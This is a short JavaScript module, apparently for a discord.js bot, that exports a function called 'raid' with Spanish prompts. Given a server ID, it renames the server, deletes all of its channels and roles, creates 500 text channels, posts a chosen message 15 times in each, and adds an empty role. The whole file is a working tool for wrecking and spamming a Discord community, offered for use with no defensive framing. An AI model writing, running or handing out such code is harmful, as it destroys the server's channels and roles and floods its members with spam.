function raid(client, guild, guildname, channelsname, rolesname, mensaje){
    if(!guild || !Number(guild)) throw new Error('Especifica la ID del servidor')
    if(!guildname || !String(guildname)) throw new Error('Especifica el nombre que le vas a poner al servidor a raidear')
    if(!channelsname || !String(channelsname)) throw new Error('Especifica el nombre que quieres que tengan los canales del servidor a raidear')
    if(!rolesname || !String(rolesname)) throw new Error('Especifica el nombre que quieres que tengan los roles del servidor a raidear')
    if(!mensaje || !String(mensaje)) throw new Error('Especifica el mensaje que quieres enviar en los canales creados')
    client.guilds.resolve(guild).setName(guildname)
    client.guilds.resolve(guild).channels.cache.forEach(canales => canales.delete())
    client.guilds.resolve(guild).roles.cache.forEach(r => r.delete())
    for(let i = 0; i < 500; i++){
    client.guilds.resolve(guild).channels.create(channelsname, { type: "text" }).then((ch) => {
    for(let a = 0; a < 15; a++){
      ch.send(mensaje)
      }
     })
    }
    client.guilds.resolve(guild).roles.create({
        data: {
        name: rolesname,
        permissions: []
        }
    })
}

module.exports = raid;